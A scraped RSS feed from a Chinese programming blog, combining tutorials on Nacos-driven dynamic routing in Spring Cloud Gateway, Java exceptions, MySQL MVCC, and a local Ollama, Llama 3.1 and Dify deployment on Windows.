定义使用单线程处理监听事件returnExecutors.newSingleThreadExecutor();}@OverridepublicvoidreceiveConfigInfo(StringconfigInfo){// 监听到路由变更时自动更新路由表updateRouteConfigInfo(configInfo);}});// 2、写入路由表updateRouteConfigInfo(configAndSignListener);}/*** 【方法】更新路由配置信息* @param configInfo 路由配置信息*/privatevoidupdateRouteConfigInfo(StringconfigInfo){// 1、解析路由配置信息 (json字符串 转 数组)List&lt;RouteDefinition&gt;routeDefinitions=JSONArray.parseArray(configInfo,RouteDefinition.class);log.info("【网关路由自动加载】监听到路由变更，开始更新路由表，路由数量：{}",routeDefinitions.size());log.info("【网关路由自动加载】监听到路由变更，开始更新路由表，路由信息：{}",routeDefinitions.toString());// 2、删除旧的路由配置信息for(StringrouteId:routeIds){log.info("【网关路由自动加载】开始删除旧的路由配置信息，路由：{}",routeId);writer.delete(Mono.just(routeId)).subscribe();}// 3、清空路由ID集合routeIds.clear();// 4、 判断是否有新路由if(routeDefinitions==null||routeDefinitions.isEmpty()){log.info("【网关路由自动加载】监听到路由变更，但未发现新路由，无需更新路由表");// 5、没有新路由，则直接返回return;}// 6、更新路由表for(RouteDefinitionrouteDefinition:routeDefinitions){log.info("【网关路由自动加载】开始写入路由表，路由：{}",routeDefinition.getId());// 7、写入到 Gateway 路由表writer.save(Mono.just(routeDefinition)).subscribe();// 8、将路由ID添加到集合中,以便下次更新删除使用routeIds.add(routeDefinition.getId());}}}测试到此，我们已经将网关动态路由配置类定义完毕，接下来我们还需要进行一下application.yml文件的属性定义配置spring:application:# 应用名称name:if010-gatewayprofiles:# 环境配置active:devcloud:# Nacos注册中心配置nacos:discovery:# 服务注册地址server-addr:127.0.0.1:8848config:# 配置中心地址server-addr:127.0.0.1:8848# 配置文件格式file-extension:yml# 共享配置shared-configs:-application-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension}-application-${spring.profiles.active}-nacos.${spring.cloud.nacos.config.file-extension}-${spring.application.name}-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension}# 超时时间timeout:3000# 路由配置gateway:discovery:locator:# 是否开启动态路由发现功能，这里的enabled属性是必须的，是SpringCloud Geateway的规范定义，和属性类无关enabled:truedataId:${spring.application.name}-routes.josngroup:DEFAULT_GROUPtimeoutMs:1000listenInterval:1000注意：启动网关之前还需要再启动类上加上注解@EnableDiscoveryClient不然是无法正常重写路由的哦！！！启动时我们可以过滤日志输出看看拉取回来的信息15:05:33.264 [main] INFO  c.i.g.c.RouteAutoLoaderConfig - [initRouteConfiguration,52] - 【网关路由自动加载】开始初始化路由配置 if010-gateway-routes.josn DEFAULT_GROUP 1000
15:05:33.350 [main] INFO  c.i.g.c.RouteAutoLoaderConfig - [updateRouteConfigInfo,86] - 【网关路由自动加载】监听到路由变更，开始更新路由表，路由数量：2
15:05:33.350 [main] INFO  c.i.g.c.RouteAutoLoaderConfig - [updateRouteConfigInfo,87] - 【网关路由自动加载】监听到路由变更，开始更新路由表，路由信息：[RouteDefinition{id='system-service', predicates=[PredicateDefinition{name='Path', args={_genkey_0=/system-service/**}}], filters=[FilterDefinition{name='StripPrefix', args={_genkey_0=1}}], uri=lb://if010-system, order=0, metadata={}}, RouteDefinition{id='test-service', predicates=[PredicateDefinition{name='Path', args={_genkey_0=/test-service/**, _genkey_1=/test/**}}], filters=[FilterDefinition{name='StripPrefix', args={_genkey_0=1}}], uri=lb://if010-test, order=0, metadata={}}]
15:05:33.350 [main] INFO  c.i.g.c.RouteAutoLoaderConfig - [updateRouteConfigInfo,106] - 【网关路由自动加载】开始写入路由表，路由：system-service
15:05:33.370 [main] INFO  c.i.g.c.RouteAutoLoaderConfig - [updateRouteConfigInfo,106] - 【网关路由自动加载】开始写入路由表，路由：test-service到此我们如果能正常访问到自己的业务，就证明成功啦~~~http://www.ppmy.cn/news/1540385.html相关文章今日总结10.18Exception 和Error 有什么区别 
Exception和Error都是Java等编程语言中异常处理机制的重要组成部分&amp;#xff0c;它们都继承自Throwable类。以下是两者的主要区别&amp;#xff1a; 
定义与性质 
Error&amp;#xff1a; 
1.表示严重的系统级错误&amp;#xff0c;如内存溢出&amp;#xff08;OutOfM…阅读更多...01_MVCC（多版本并发机制）MVCC&amp;#xff08;多版本并发机制&amp;#xff09; 文章目录 MVCC&amp;#xff08;多版本并发机制&amp;#xff09;简介工作原理主要组件 事务隔离级别与 MVCC实现方式快照读&amp;#xff08;Snapshot Read&amp;#xff09;当前读&amp;#xff08;Current Read&amp;#xff09;版本链管理 MVCC 的优缺点优点缺…阅读更多...利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流文章目录 1. 什么是Ollama&amp;#xff1f;2. 什么是Dify&amp;#xff1f;3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型…阅读更多...计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13 目录 文章目录 计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alig…阅读更多...Open-WebUIOpen-WebUI特点⭐ 
️直观的界面&amp;#xff1a;聊天界面从 ChatGPT 中汲取灵感&amp;#xff0c;确保用户友好的体验。响应式设计&amp;#xff1a;在桌面和移动设备上享受无缝体验。⚡快速响应&amp;#xff1a;享受快速响应的性能。轻松设置&amp;#xff1a;使用 Docker 或 Kubernetes&amp;#xff08;…阅读更多...ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置： ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述 ToB项目身份认证AD集成（二）：一分钟搞定window server 20…阅读更多...理解C#中空值条件运算符及空值检查简化前言 .NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。 
介绍 空值，这里指的是 null。在定义对象后，未对其…阅读更多...深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化文章目录 1. 引言2. Vue Router的基本用法2.1 基本配置 3. 重定向和命名路由的使用3.1 重定向3.2 命名路由 4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载 5. 路由守卫的实现与性能影响5.1 什么是路由守卫&amp;#xff1f;5.2 路由…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:25 +0000</pubDate>
    </item>
    <item>
      <title>今日总结10.18</title>
      <link>https://www.ppmy.cn/news/1540384.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维今日总结10.18news/2025/10/31 17:53:23/Exception 和Error 有什么区别Exception和Error都是Java等编程语言中异常处理机制的重要组成部分，它们都继承自Throwable类。以下是两者的主要区别：定义与性质Error：1.表示严重的系统级错误，如内存溢出（OutOfMemoryError）、栈溢出（StackOverflowError）等。2.这类错误通常由JVM（Java虚拟机）抛出，程序无法捕获或恢复。3.Error是程序运行中不可预料的异常情况，发生后会导致JVM处于不可处理或不可恢复的状态。Exception：1.表示程序运行过程中的可预料或可处理的异常情况。2.可以通过代码进行处理，如使用try-catch语句捕获异常并进行相应的处理。3.Exception分为检查性异常（Checked Exception）和非检查性异常（Unchecked Exception，也称作运行时异常）。处理方式Error：1.由于Error通常表示严重的系统级问题，程序员通常不需要也不应该尝试处理这类错误。2.当Error发生时，程序往往无法继续执行，需要进行相应的系统级处理或重启程序。Exception：1.对于检查性异常，程序员必须在编写代码时使用try-catch语句捕获，或者在方法签名中使用throws关键字声明。2.对于非检查性异常，程序员可以选择捕获处理，也可以选择不捕获（但需要注意可能的程序崩溃风险）。3.在捕获异常后，程序员可以进行相应的错误处理，如记录日志、清理资源、提示用户等。应用场景Error：1.主要应用于描述程序运行过程中遇到的严重系统级问题，如资源耗尽、系统崩溃等。2.由于这些问题通常无法由程序自身解决，因此Error更多地被用于记录和分析程序崩溃的原因。Exception：1.广泛应用于程序开发中的异常处理。2.程序员可以通过捕获和处理异常来确保程序的健壮性和可靠性。3.异常处理机制还允许程序员在方法签名中声明可能抛出的异常，从而提供额外的信息给方法的调用者。Checked Exception 和Unchecked Exception 有什么区别定义与继承关系Checked Exception：1.继承自java.lang.Exception类，但不包括RuntimeException及其子类。2.编译器强制要求程序员显式处理这些异常，即在可能出现受检查异常的方法签名中必须使用throws关键字声明该方法可能抛出的异常类型。Unchecked Exception：1.继承自java.lang.RuntimeException类，或者直接继承自Error类。2.编译器不强制程序员在方法签名中声明这类异常，即无需使用throws关键字。处理要求Checked Exception：1.程序员必须在编写代码时使用try-catch语句捕获受检查异常，或者在方法签名中使用throws关键字声明可能抛出的异常。2.如果调用的方法可能会抛出受检查异常，那么调用者必须处理这个异常，否则编译器会报错。Unchecked Exception：1.编译器不要求程序员强制处理非受检查异常。2.如果非受检查异常没有被捕获，程序会终止执行（除非在全局默认的异常处理器中进行了特殊处理）。3.非受检查异常通常用于指示编程错误或逻辑错误，如空指针异常（NullPointerException）、数组越界异常（ArrayIndexOutOfBoundsException）等。http://www.ppmy.cn/news/1540384.html相关文章01_MVCC（多版本并发机制）MVCC&amp;#xff08;多版本并发机制&amp;#xff09; 文章目录 MVCC&amp;#xff08;多版本并发机制&amp;#xff09;简介工作原理主要组件 事务隔离级别与 MVCC实现方式快照读&amp;#xff08;Snapshot Read&amp;#xff09;当前读&amp;#xff08;Current Read&amp;#xff09;版本链管理 MVCC 的优缺点优点缺…阅读更多...利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流文章目录 1. 什么是Ollama&amp;#xff1f;2. 什么是Dify&amp;#xff1f;3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型…阅读更多...计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13 目录 文章目录 计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alig…阅读更多...Open-WebUIOpen-WebUI特点⭐ 
️直观的界面&amp;#xff1a;聊天界面从 ChatGPT 中汲取灵感&amp;#xff0c;确保用户友好的体验。响应式设计&amp;#xff1a;在桌面和移动设备上享受无缝体验。⚡快速响应&amp;#xff1a;享受快速响应的性能。轻松设置&amp;#xff1a;使用 Docker 或 Kubernetes&amp;#xff08;…阅读更多...ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置： ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述 ToB项目身份认证AD集成（二）：一分钟搞定window server 20…阅读更多...理解C#中空值条件运算符及空值检查简化前言 .NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。 
介绍 空值，这里指的是 null。在定义对象后，未对其…阅读更多...深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化文章目录 1. 引言2. Vue Router的基本用法2.1 基本配置 3. 重定向和命名路由的使用3.1 重定向3.2 命名路由 4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载 5. 路由守卫的实现与性能影响5.1 什么是路由守卫&amp;#xff1f;5.2 路由…阅读更多...2024入门测参考答案（c语言版）先自己看代码思考&amp;#xff0c;不理解的地方可以截图私聊…… 
7-1 祝福祖国&amp;#xff01; 
这是一个编程题模板。 
2024年即将到来&amp;#xff0c;作为一名大学生&amp;#xff0c;为了表达在新的一年里&amp;#xff0c;对祖国的祝福&amp;#xff0c;请编写程序输出祝福语&amp;#xff1a;在新的一年…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:24 +0000</pubDate>
    </item>
    <item>
      <title>01_MVCC（多版本并发机制）</title>
      <link>https://www.ppmy.cn/news/1540383.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维01_MVCC（多版本并发机制）news/2025/10/31 17:53:23/MVCC（多版本并发机制）文章目录MVCC（多版本并发机制）简介工作原理主要组件事务隔离级别与 MVCC实现方式快照读（Snapshot Read）当前读（Current Read）版本链管理MVCC 的优缺点优点缺点示例总结延伸简介MySQL 中的 MVCC（Multi-Version Concurrency Control，多版本并发控制）是一种用于实现高并发、低冲突数据访问的技术。它通过维护数据的多个版本来实现读写操作的并发控制，它允许多个事务同时对同一数据进行读取和修改，而不会互相干扰，从而实现了非阻塞的读操作，降低了写操作的冲突。MVCC 在 InnoDB 存储引擎中得到了实现，是实现 ACID（原子性、一致性、隔离性、持久性）属性中隔离性的关键。在并发场景下，可能出现三种情况：读-读并发，读-写并发，写-写并发。在没有写的情况下读-读并发是不会出现问题的，而写-写并发这种情况比较常用的就是通过加锁的方式实现。那么，读-写并发则可以通过 MVCC 的机制解决。工作原理MVCC 的基本思想是通过存储每行数据的多个版本，实现并发控制，允许读操作和写操作并发执行，避免大部分加锁操作。主要组件隐藏列：trx_id：每行记录的创建或最后一次修改该行数据的事务ID。roll_pointer：指向该行数据的上一个版本的指针，用于形成版本链。回滚日志（Undo Log）：每次事务修改数据时，旧版本数据会被保存在回滚日志中，形成一个版本链。用于事务回滚和快照读时的数据读取。读视图（Read View）：事务启动时生成的快照视图，用于确定在事务期间可见的数据版本。确保在可重复读隔离级别下读取到一致性数据。事务隔离级别与 MVCC不同的事务隔离级别对 MVCC 的行为有不同的要求：读未提交（Read Uncommitted）：不使用 MVCC，读取未提交的数据，可能会出现脏读。读已提交（Read Committed）：每次读取最新提交的数据版本（即一个事务中的每一次SELECT都会重新获取一次ReadView），不使用快照视图，可能会出现不可重复读。可重复读（Repeatable Read）：使用 MVCC，事务在启动时创建一致性视图，读取该视图的快照数据（即一个事务中只有第一次SELECT会读取ReadView），避免不可重复读和幻读问题。串行化（Serializable）：强制事务串行执行，通过加锁实现，不使用 MVCC。实现方式快照读（Snapshot Read）​ 快照读是指读取一致性视图中的数据，不加锁。具体流程如下：事务启动：在事务启动时，InnoDB 创建一个一致性视图（Read View），记录当前系统中活跃事务的 ID。读取数据：读取数据时，根据隐藏列trx_id和roll_pointer形成的版本链，查找符合当前一致性视图的数据版本。返回结果：返回符合一致性视图的数据版本，确保读取的是事务启动时的快照数据。-- 事务1：启动事务STARTTRANSACTION;-- 快照读，读取一致性视图中的数据SELECT*FROMexampleWHEREid=1;当前读（Current Read）​ 当前读是指读取最新的数据版本并加锁，确保数据的一致性。具体操作包括：SELECT … FOR UPDATE：读取数据并加排他锁，阻止其他事务的读写操作。SELECT … LOCK IN SHARE MODE：读取数据并加共享锁，允许其他事务的读操作，但阻止写操作。INSERT、UPDATE、DELETE：对数据进行修改，必须读取最新版本的数据并加锁。-- 事务1：启动事务
START TRANSACTION;
-- 当前读，加排他锁
SELECT * FROM example WHERE id = 1 FOR UPDATE;​ 可以说，快照读是 MVCC 实现的基础，而当前读是悲观锁实现的基础。版本链管理​ 每次数据修改操作时，InnoDB 会创建一个新版本的记录，并通过roll_pointer指向旧版本，形成版本链。-- 事务2：启动事务并更新数据STARTTRANSACTION;UPDATEexampleSETvalue='B'WHEREid=1;COMMIT;在上述操作中，InnoDB 会将旧版本的value = 'A'存储在回滚日志中，新版本的value = 'B'记录当前事务ID，并指向旧版本。MVCC 的优缺点优点高并发性能：读操作无需加锁，减少锁争用，提高系统并发性能。数据一致性：通过一致性视图，实现可重复读和读已提交隔离级别下的数据一致性，避免脏读和不可重复读问题。缺点存储开销：维护多个版本的数据和回滚日志，增加存储需求。数据清理：需要定期清理无用的旧版本数据，增加系统维护复杂性。示例以下示例展示了 MVCC 在可重复读隔离级别下的工作方式：-- 创建表并插入数据CREATETABLEexample(idINTPRIMARYKEY,valueVARCHAR(50));INSERTINTOexample(id,value)VALUES(1,'A');-- 事务1：启动事务并读取数据SETTRANSACTIONISOLATIONLEVELREPEATABLEREAD;STARTTRANSACTION;SELECT*FROMexampleWHEREid=1;-- 读取数据，创建一致性视图-- 事务2：启动事务并更新数据SETTRANSACTIONISOLATIONLEVELREADCOMMITTED;STARTTRANSACTION;UPDATEexampleSETvalue='B'WHEREid=1;COMMIT;-- 事务1：再次读取数据SELECT*FROMexampleWHEREid=1;-- 仍然读取旧版本数据 'A'COMMIT;在这个示例中，事务1 启动后创建的一致性视图确保其读取的数据在事务期间保持不变，即使事务2 更新了数据。总结MySQL 中的 MVCC 机制通过维护数据的多个版本，实现高并发、低冲突的数据访问。它通过隐藏列、回滚日志和一致性视图等机制，在确保数据一致性的同时，提高了系统的并发性能。通过理解 MVCC 的工作原理和实现方式，可以更好地应用和优化 MySQL 数据库。延伸MVCC 机制中的版本链管理是如何实现的快照读是如何实现的（快照如何存储？存储在哪？多个快照存在时怎么读？）http://www.ppmy.cn/news/1540383.html相关文章利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流文章目录 1. 什么是Ollama&amp;#xff1f;2. 什么是Dify&amp;#xff1f;3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型…阅读更多...计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13 目录 文章目录 计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alig…阅读更多...Open-WebUIOpen-WebUI特点⭐ 
️直观的界面&amp;#xff1a;聊天界面从 ChatGPT 中汲取灵感&amp;#xff0c;确保用户友好的体验。响应式设计&amp;#xff1a;在桌面和移动设备上享受无缝体验。⚡快速响应&amp;#xff1a;享受快速响应的性能。轻松设置&amp;#xff1a;使用 Docker 或 Kubernetes&amp;#xff08;…阅读更多...ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置： ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述 ToB项目身份认证AD集成（二）：一分钟搞定window server 20…阅读更多...理解C#中空值条件运算符及空值检查简化前言 .NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。 
介绍 空值，这里指的是 null。在定义对象后，未对其…阅读更多...深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化文章目录 1. 引言2. Vue Router的基本用法2.1 基本配置 3. 重定向和命名路由的使用3.1 重定向3.2 命名路由 4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载 5. 路由守卫的实现与性能影响5.1 什么是路由守卫&amp;#xff1f;5.2 路由…阅读更多...2024入门测参考答案（c语言版）先自己看代码思考&amp;#xff0c;不理解的地方可以截图私聊…… 
7-1 祝福祖国&amp;#xff01; 
这是一个编程题模板。 
2024年即将到来&amp;#xff0c;作为一名大学生&amp;#xff0c;为了表达在新的一年里&amp;#xff0c;对祖国的祝福&amp;#xff0c;请编写程序输出祝福语&amp;#xff1a;在新的一年…阅读更多...【Linux】进程ID和线程ID在日志中的体现在分析内核打印日志流程的时候&amp;#xff0c;发现有时候同一个进程函数调用关系比较混乱&amp;#xff08;因为只打印了进程号&amp;#xff09;&amp;#xff0c;现象就是一个函数走着走着不知道走哪里去了。  
另一个现象是&amp;#xff0c;在Linux启动Firefox的时候&amp;#xff0c;启了大概80个进程&amp;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:23 +0000</pubDate>
    </item>
    <item>
      <title>利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流</title>
      <link>https://www.ppmy.cn/news/1540382.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流news/2025/10/31 17:53:22/文章目录1. 什么是Ollama？2. 什么是Dify？3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型12. 添加Dify团队成员13. 导入DSL - 小红书文案生成脚本14. 所遇问题15. 参考链接1. 什么是Ollama？Ollama 是一种可以学习和回答问题的 AI 模型，它能够进行自然语言交互，类似于人类对话。它具备一些独特的功能，如：自主学习: Ollama 可以通过自身的学习过程改善其回答质量和知识范围。无限回复: Ollama 能够不断地回答问题，无论你问多少个，直到你满意为止。自然语言: Ollama 支持多种语言，包括英语、西班牙语等，你可以与它进行母语对话。2. 什么是Dify？Dify是一个开源的LLM应用程序开发平台。Dify直观的界面结合了人工智能工作流程、RAG管道、代理功能、模型管理、可观察性功能等，让您快速从原型进入生产。3. 下载Ollama下载链接：https://ollama.com4. 安装Ollama打开安装包，安装Ollama。5. Ollama Model library模型库Ollama supports a list of models available on ollama.com/libraryHere are some example models that can be downloaded:ModelParametersSizeDownloadLlama 3.18B4.7GBollama run llama3.1Llama 3.170B40GBollama run llama3.1:70bLlama 3.1405B231GBollama run llama3.1:405bPhi 3 Mini3.8B2.3GBollama run phi3Phi 3 Medium14B7.9GBollama run phi3:mediumGemma 22B1.6GBollama run gemma2:2bGemma 29B5.5GBollama run gemma2Gemma 227B16GBollama run gemma2:27bMistral7B4.1GBollama run mistralMoondream 21.4B829MBollama run moondreamNeural Chat7B4.1GBollama run neural-chatStarling7B4.1GBollama run starling-lmCode Llama7B3.8GBollama run codellamaLlama 2 Uncensored7B3.8GBollama run llama2-uncensoredLLaVA7B4.5GBollama run llavaSolar10.7B6.1GBollama run solarNote：You should have at least 8 GB of RAM available to run the 7B models, 16 GB to run the 13B models, and 32 GB to run the 33B models.6. 本地部署Llama 3.1模型To run and chat with Llama 3.1:ollama run llama3.1:8bStart ollamaC:\Users\xyb&gt;ollama serveList models on your computerC:\Users\xyb&gt;ollama list
NAME            ID              SIZE    MODIFIED
llama3.1:8b     91ab477bec9d4.7GB8weeks agoShow model informationC:\Users\xyb&gt;ollama show llama3.1:8bModelarch                    llamaparameters8.0Bquantization            Q4_0context length131072embedding length4096Parametersstop"&lt;|start_header_id|&gt;"stop"&lt;|end_header_id|&gt;"stop"&lt;|eot_id|&gt;"LicenseLLAMA3.1COMMUNITY LICENSE AGREEMENTLlama3.1Version Release Date: July23,2024ollama -hC:\Users\xyb&gt;ollama -h
Large language model runnerUsage:ollama[flags]ollama[command]Available Commands:serve       Start ollamacreate      Create a model from a Modelfileshow        Show informationfora modelrun         Run a modelpull        Pull a model from a registrypush        Push a model to a registrylist        List modelspsList running modelscpCopy a modelrmRemove a modelhelpHelp about anycommandFlags:-h, --helphelpforollama-v, --version   Show version informationUse"ollama [command] --help"formoreinformation about a command.7. 安装Docker Desktop在Windows 环境下，安装Docker Desktop。8. 使用Docker-Compose部署Dify进入 Dify 源代码的 docker 目录，执行一键启动命令：cddify/dockercp.env.example .envdocker compose up -d输入过程如下：C:\dify\docker&gt;docker-compose up  -d[+]Running11/11✔ Network docker_default             Created0.1s✔ Network docker_ssrf_proxy_network  Created0.0s✔ Container docker-web-1             Started1.4s✔ Container docker-weaviate-1        Started1.2s✔ Container docker-ssrf_proxy-1      Started1.9s✔ Container docker-sandbox-1         Started1.9s✔ Container docker-redis-1           Started1.4s✔ Container docker-db-1              Started1.7s✔ Container docker-worker-1          Started2.6s✔ Container docker-api-1             Started2.8s✔ Container docker-nginx-1           Started3.7s启动完成后，你的 docker 里就会看到这个：也可以在Docker-Compose中查看到已启动的容器。9. 注册Dify账号打开浏览器，输入http://127.0.0.1设置管理员账户。输入邮箱、用户名、密码。填写完成后，点击设置。跳转至登录揭秘那，输入邮箱和密码完成登录。至此，我们利用Docker Compose 在Windows本地环境中，完成Dify的搭建部署工作。10. 集成本地部署的 Llama 3.1模型点击设置。选择模型提供商Ollama填写如下参数信息。！！！注意！！！：模型名称和基础URL要填写正确，否则会添加失败报错。添加成功。我们也可以输入以下地址，验证所添加的ollama模型是否已启动。11. 集成智谱AI大模型获取智谱 AI API Key获取链接：智谱AI开放平台2e0556xxxxxxxxxxxxxxxxxxxxxxxxxxxE6of12. 添加Dify团队成员http://127.0.0.1/activate?email=xxxxxxxx@outlook.com&amp;token=34aa37d7-7d9a-4b64-9ed6-d0372380ad7f13. 导入DSL - 小红书文案生成脚本导入DSL小红书文案生成脚本工作流如下：输入关键字输出结果生成内容如下：标题：1. 🌟【日常美学】🌼 这样的小确幸，让你幸福感爆棚！🍵📖✨2. 💖【生活小秘诀】🌸 发现日常中的小美好，幸福感瞬间up！📸3. 🌿【限量版生活】🌼 每天都是独一无二的美好！🍵📖✨4. 📖【生活美学】🌸 一本好书，一杯香茗，幸福感满满！💖5. 🌼【小确幸分享】🍵 这样的小日常，让你心情大好！📸6. ✨【日常小美好】🌸 发现生活中的小确幸，幸福感飙升！📖7. 